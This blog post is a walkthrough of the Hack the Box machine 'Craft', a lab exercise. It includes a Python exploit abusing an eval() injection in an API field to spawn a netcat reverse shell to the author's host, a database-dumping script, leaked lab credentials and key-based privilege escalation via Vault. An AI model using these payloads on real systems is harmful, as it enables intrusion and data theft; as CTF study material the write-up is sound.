+++
author = "Nick"
categories = ["api", "CTF", "enumeration", "netcat", "python", "web services", "custom exploit", "Gogs"]
date = 2020-01-04T16:39:23Z
description = ""
draft = false
thumbnail = "/images/2019/08/info.png"
slug = "hack-the-box-craft"
summary = "Welcome back friends! Today we'll be doing the brand new box, Craft. This will be the first time I do a box as it's released and hope to continue this trend! So lets jump in!"
tags = ["api", "CTF", "enumeration", "netcat", "python", "web services", "custom exploit", "Gogs"]
title = "Hack the Box - Craft"

+++


Welcome back friends! Today we'll be doing the brand new box, Craft. This will be the first time I do a box as it's released and hope to continue this trend! So lets jump in!

Update: I should probably buy the Pro subscription from HtB. Doing a new box as it's released proved challenging. Often unresponsive and rebooting frequently. Lessons learned I guess.

As always, we kick it off with a standard nmap scan.

```bash
nmap -sC -sV -oA Craft/scan 10.10.10.110
```

We see a pretty limited amount of results.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-15 16:11 EDT
Nmap scan report for 10.10.10.110
Host is up (0.52s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.08 seconds
```

Seems pretty low, lets try another swing at the nmap, but all ports.

![](/images/2019/07/image-21.png)

We see that port 6022 is open. I telnet into the port and get back what looks like some SSH responses.

![](/images/2019/07/image-22.png)

Looks like its using SSH-go as the server on this port. When we try to ssh into that port, we are prompted for a SSH key. We'll come back to this it seems.

We see the site being hosted on the box is talking about an API as well as a link to the API and its git repository, which is also locally hosted. Maybe some API enumeration? The API page has options to execute the API command and return the result back, we might be able to leverage this later on to get it to run something we want. So lets add some hostname entries so we can resolve better. We'll add api.craft.htb, craft.htb and gogs.craft.htb. Now that we can resolve those, lets check it our a bit more in depth.

The first stop will be to take a look at the git repository. In this case we're going to look through the commit history to see what we can find. We'll want to enumerate all of our domains. A run of Dirbuster against gogs.craft.htb and we see our users. If we dig though the personal history, we see that Dinesh has left us a nice script, with authorization inside it!

![](/images/2019/07/image-93.png)

If we take this script and recreate it, we get a valid authentication using those credentials. We can also test it against the API page to validate and download the token. Looks like we can use these credentials to authenticate to gogs.craft.htb as well.

When we are sifting though the notes we see 1 issue. This shows a possible problem with the ABV value.

![](/images/2019/07/image-94.png)

When we look at the changes made, we see it's using the function eval(). This is might be the way in. We can leverage this function to call remote code! More on why eval() is bad, here and here.

So what we'll do is modify the script Dinesh made for testing. We'll simply pass it `__import__('os').system('nc 10.10.10.15.248 1337 -e /bin/sh')` and get a netcat shell back and see what we can find. Here's what our modified code looks like:

```python
#!/usr/bin/env python

import os
import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']
headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.
print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '15'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)

# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = '__import__(\'os\').system(\'nc 10.10.15.248 1337 -e \/bin\/sh\')'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'Junk'
json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

After we run our codewe get a netcat connection!

![](/images/2019/07/image-95.png)

Well, this sends us to /opt/app as root, but when we look around, there's nothing here. It seems we're in a docker container. So in this case, we're going to head bad to where we landed and see whats here. When we run dbtest.py, we get back what the script is calling, so maybe we should try and modify it so we can dump some info.

Here's what our modified code looks like:
```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database
print("Host: "+ settings.MYSQL_DATABASE_HOST)
print("User: "+ settings.MYSQL_DATABASE_USER)
print("Password: "+ settings.MYSQL_DATABASE_PASSWORD)
print("Database: "+ settings.MYSQL_DATABASE_DB)
connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                                 user=settings.MYSQL_DATABASE_USER,
                                 password=settings.MYSQL_DATABASE_PASSWORD,
                                 db=settings.MYSQL_DATABASE_DB,
                                 cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "select * from user"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```

After we run our script, we get the following back:

![](/images/2019/07/image-96.png)

We now have three login credentials, lets see if any of these work on SSH. No dice. Lets try to log into Gogs with these. Turns our Gilfoyle's works. Now we can browse around what Gilfoyle has been doing. He has another repository as well. On inspection it seems to be the docker container that we are hosting the service in. When we check out the changes, we see a private key. We'll save this file and use it to authenticate via SSH.

![](/images/2019/07/image-97.png)

Great we are in. Now we can snag our user.txt and look for a way to pivot to root. Once we've explored the system, we notice that there is a program called [Vault](https://www.vaultproject.io/docs/install/index.html). I've never worked with this application before but gaining root was actually very easy once I knew what I was looking for and how Vault functions. After reading documentation for a few hours and trying many MANY commands (and failing) to gather what info I could on the structure that was setup, I had to take a step back and rethink the entry points. Then I realized that Vault has documents on SSH and keysigning. Lucky for us [Vault has a document](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html) on how to do just that! We follow that document through and....

![](/images/2019/08/image.png)

We get in using OTP. To the flag!

![](/images/2019/08/image-1.png)

We did it, both flags captured. This was a fun and new box for me. I learned a lot on some software I've never used before.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

